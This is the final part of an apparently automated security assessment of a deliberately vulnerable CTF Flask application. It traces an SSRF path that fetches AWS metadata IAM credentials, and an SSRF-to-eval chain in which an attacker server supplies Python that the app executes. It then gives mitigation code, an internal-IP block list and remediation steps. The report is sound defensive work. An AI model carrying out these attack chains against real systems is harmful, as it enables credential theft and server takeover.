GET /app endpoint (triggers Flask app)
    ↓
Flask app app.py (Line 9)
  - Reads stored URL from http://nginx/api/get
    ↓
Flask app app.py (Line 10)
  - requests.get(api).text  [SSRF EXECUTION]
  - Makes HTTP request to 169.254.169.254
    ↓
AWS Metadata Service
  - Returns IAM credentials
    ↓
Flask app returns credentials to attacker
```

**Chained with RCE:**

```
SSRF + RCE Chain:
1. Set URL to attacker-controlled server
2. Attacker server returns: {"script": "malicious Python code"}
3. eval() executes code → Full server compromise
```

---

### SSRF Sink Summary

**Total SSRF Sinks Found:** 1 (CRITICAL severity)

| Sink Location | Sink Type | User Input Parameter | Validation | Internal Network Risk | Cloud Metadata Risk | Severity |
|---------------|-----------|---------------------|------------|---------------------|-------------------|----------|
| app.py:10 | requests.get() | url (via /api/set) | NONE | ✅ YES | ✅ YES | CRITICAL |

**Additional HTTP Requests (Not SSRF Sinks):**

The following `requests.get()` calls exist but are **not vulnerable to SSRF** because they use hardcoded URLs:

- **Line 9:** `requests.get('http://nginx/api/get')` - Hardcoded internal endpoint
- **Line 13:** `requests.get('http://nginx/name/get')` - Hardcoded internal endpoint

These are **internal service calls** and not exploitable for SSRF (user cannot control the destination).

---

### No Other SSRF Sinks Found

The following SSRF sink categories were searched but **not found** in network-accessible code:

#### Raw Sockets & Connect APIs: NONE
- ❌ No `socket.connect()` calls
- ❌ No `net.Dial()` (Go)
- ❌ No `TcpClient`, `UdpClient` (C#)
- ❌ No `java.net.Socket` (Java)

#### URL Openers & File Includes: NONE
- ❌ No `file_get_contents()` (PHP)
- ❌ No `fopen()` with URLs
- ❌ No `include_once`, `require_once` with external sources
- ❌ No `fs.readFile()` with URLs (Node.js)

#### Headless Browsers & Render Engines: NONE
- ❌ No Puppeteer (`page.goto()`)
- ❌ No Playwright (`page.navigate()`)
- ❌ No Selenium WebDriver
- ❌ No html-to-pdf converters (wkhtmltopdf)

#### Media Processors: NONE
- ❌ No ImageMagick, GraphicsMagick
- ❌ No FFmpeg
- ❌ No image optimization services with URL parameters

#### Link Preview & Unfurlers: NONE
- ❌ No link expansion functionality
- ❌ No oEmbed endpoint fetchers
- ❌ No URL metadata extractors

#### Webhook Testers & Callback Verifiers: NONE
- ❌ No "ping my webhook" functionality
- ❌ No outbound callback verification

#### SSO/OIDC Discovery & JWKS Fetchers: NONE
- ❌ No OpenID Connect discovery endpoints
- ❌ No JWKS fetchers
- ❌ No OAuth authorization server metadata

#### Importers & Data Loaders: NONE
- ❌ No "import from URL" functionality
- ❌ No RSS/Atom feed readers
- ❌ No remote config file loaders

---

### Recommended Mitigations (Not Implemented)

**Priority 1 - Eliminate User Control:**
```python
# Replace URL parameter with enum:
ALLOWED_OPERATIONS = {
    'default_script': 'http://flask_api:8081/script',
    'health_check': 'http://flask_api:8081/healthcheck'
}

@app.route('/app')
def home():
    operation = request.args.get('operation', 'default_script')
    if operation not in ALLOWED_OPERATIONS:
        abort(400, "Invalid operation")
    api = ALLOWED_OPERATIONS[operation]
    script = requests.get(api).text
    # ... rest of code
```

**Priority 2 - URL Allow-Listing:**
```python
import urllib.parse

ALLOWED_HOSTS = ['flask_api']
ALLOWED_PORTS = [8081]

def validate_url(url):
    parsed = urllib.parse.urlparse(url)
    
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")
    
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")
    
    if parsed.port and parsed.port not in ALLOWED_PORTS:
        raise ValueError("Port not allowed")
    
    return url
```

**Priority 3 - IP Address Blocking:**
```python
from ipaddress import ip_address, ip_network
import socket

INTERNAL_NETWORKS = [
    ip_network('10.0.0.0/8'),
    ip_network('172.16.0.0/12'),
    ip_network('192.168.0.0/16'),
    ip_network('127.0.0.0/8'),
    ip_network('169.254.0.0/16'),  # Cloud metadata
]

def is_internal_ip(hostname):
    try:
        ip = ip_address(socket.gethostbyname(hostname))
        for network in INTERNAL_NETWORKS:
            if ip in network:
                return True
    except:
        pass
    return False
```

---

**SSRF Analysis Complete**

---

# End of Security Analysis Report

**Analysis Completed:** [Auto-generated timestamp]

**Total Network-Accessible Endpoints:** 11  
**Critical Vulnerabilities:** 3 (RCE via eval(), SSRF, Debug Mode Enabled)  
**High Severity Issues:** 2 (World-Writable Config Files, No HTTPS)  
**Medium Severity Issues:** 3 (XSS Potential, Missing Security Headers, No Input Validation)

**Recommended Immediate Actions:**
1. Remove `eval()` usage - Replace with `ast.literal_eval()` or safe operation enum
2. Implement URL validation and allow-listing for SSRF prevention
3. Disable `debug=True` in production Flask applications
4. Change file permissions from 777 to 600 on `/tmp/apiurl` and `/tmp/name`
5. Implement HTTPS/TLS with valid certificates
6. Remove FLAG from `.env` file and git history
7. Implement authentication and authorization for all endpoints
8. Add security headers (CSP, HSTS, X-Frame-Options, etc.)
9. Implement input validation and sanitization across all endpoints
10. Add security monitoring and logging for all sensitive operations

**Note:** This application appears to be an intentionally vulnerable CTF challenge (XBEN-082-24) and should **NEVER be deployed in a production environment** without comprehensive security hardening.

## Authenticated Scans

### SCHEMATHESIS
Status: skipped
No API schemas found

---
Report generated at: 2025-10-28T20:54:14.845Z